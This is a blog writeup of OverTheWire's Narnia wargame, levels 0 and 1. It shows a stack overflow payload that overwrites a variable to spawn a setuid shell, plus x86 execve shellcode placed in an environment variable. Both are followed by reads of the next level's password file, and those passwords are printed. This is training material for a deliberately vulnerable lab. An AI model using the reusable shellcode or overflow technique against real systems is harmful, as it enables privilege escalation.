---
layout: post
title: narnia-writeup-00-01
excerpt: "Writeup for the Narnia (L00 & L01)  wargame on overthewire.org."
categories: [writeup]
tags: [itsec, wargame]
---

[overthewire / narina](http://www.overthewire.org/wargames/narnia/)

## Level 0 ##

As per [Narnia's introduction page](http://overthewire.org/wargames/narnia/), we first ssh into the box (`ssh narnia0@narnia.labs.overthewire.org -p 2226`). The challenges are located in `/narnia`. Let's take a look at the first one.

``` shell
narnia0@narnia:~$ pwd                                                                                   /home/narnia0                                                                                           narnia0@narnia:~$ cd /narnia                                                                            narnia0@narnia:/narnia$ ls                                                                              narnia0    narnia1    narnia2    narnia3    narnia4    narnia5    narnia6    narnia7    narnia8         narnia0.c  narnia1.c  narnia2.c  narnia3.c  narnia4.c  narnia5.c  narnia6.c  narnia7.c  narnia8.c       
```

This is the contents of the one we're interested in:

``` c
#include <stdio.h>                                                                                      #include <stdlib.h>                                                                                                                                                                                             int main(){                                                                                                     long val=0x41414141;                                                                                    char buf[20];                                                                                                                                                                                                   printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");                                         printf("Here is your chance: ");                                                                        scanf("%24s",&buf);                                                                                                                                                                                             printf("buf: %s\n",buf);                                                                                printf("val: 0x%08x\n",val);                                                                                                                                                                                    if(val==0xdeadbeef)                                                                                             system("/bin/sh");                                                                              else {                                                                                                          printf("WAY OFF!!!!\n");                                                                                exit(1);                                                                                        }                                                                                                                                                                                                               return 0;                                                                                       }                    
```

If we somehow get `val` to be equal to `0xdeadbeef`, the programm will execute a `/bin/sh`. Because this program as the sticky bit set and is owned by `narnia1`, this would escalate our privileges:

``` shell
narnia0@narnia:/narnia$ ls -l narnia0
-r-sr-x--- 1 narnia1 narnia0 7460 May 23 13:20 narnia0
```

From the source code we see that `buf` is located after `val`. This means that on the stack, overflowing `buf` (which is only 20 characters long) will cause it to start overriding `val`. This should be relatively straightforward:

``` shell
narnia0@narnia:/narnia$ ./narnia0                                                                       Correct val's value from 0x41414141 -> 0xdeadbeef!                                                      Here is your chance: AAAAAAAAAAAAAAAAAAAA                                                               buf: AAAAAAAAAAAAAAAAAAAA                                                                               val: 0x41414100                                                                                         WAY OFF!!!!
```

Now it turns out the box has Python installed. So let's use that:

``` shell
narnia0@narnia:/narnia$ python --version                                                                Python 2.7.6                                                                                            
narnia0@narnia:/narnia$ python -c "print 'A'*20 + '\xad\xde'" | ./narnia0                               Correct val's value from 0x41414141 -> 0xdeadbeef!                                                      Here is your chance: buf: AAAAAAAAAAAAAAAAAAAA��                                                        val: 0x4100dead                                                                                         WAY OFF!!!!
```

Note the byte order (we're on a little indian machine). From there it's easy to extrapolate:

``` shell
narnia0@narnia:/narnia$ python -c "print 'A'*20 + '\xef\xbe\xad\xde'" | ./narnia0                       Correct val's value from 0x41414141 -> 0xdeadbeef!                                                      Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�                                                        val: 0xdeadbeef 
narnia0@narnia:/narnia$ whoami
narnia0
```

Mmm. So we managed to overwrite `val` but 'nothing' happened. It turns out the pipe (`|`) sends EOF once done, which closes the shell (`system` does not spawn a separate process but replaced the current one). We need to find a way to hold it open whilst accepting user input. `cat` to the rescue:

``` shell
narnia0@narnia:/narnia$ (python -c "print 'A'*20 + '\xef\xbe\xad\xde'";cat) | ./narnia0                 Correct val's value from 0x41414141 -> 0xdeadbeef!                                                      Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�                                                        val: 0xdeadbeef                                                                                         whoami                                                                                                  narnia1                                                                                                 cat /etc/narnia_pass/narnia1                                                                            efeidiedae
```

Done!

## Level 1 ##

Along the same lines as the one above, this is the source code given to us:

``` c
#include <stdio.h>

int main(){
        int (*ret)();

        if(getenv("EGG")==NULL){
                printf("Give me something to execute at the env-variable EGG\n");
                exit(1);
        }

        printf("Trying to execute EGG!\n");
        ret = getenv("EGG");
        ret();

        return 0;
}
```

The aim is to store some special code (shellcode) into `EGG` which, when executed, will cause the program to give us a shell with escalated privileges.

I so happen to have some [shellcode lying around](http://perso.heavyberry.com/articles/2016-12/sec_bufferoverflow). Writing shellcode is beyond the scope of this post though.

``` shell
narnia1@narnia:/narnia$ export EGG=$(printf "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80")
narnia1@narnia:/narnia$ echo $EGG
1▒1ə▒▒̀j
       XQh//shh/bin▒▒▒▒
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

Easy peasy.
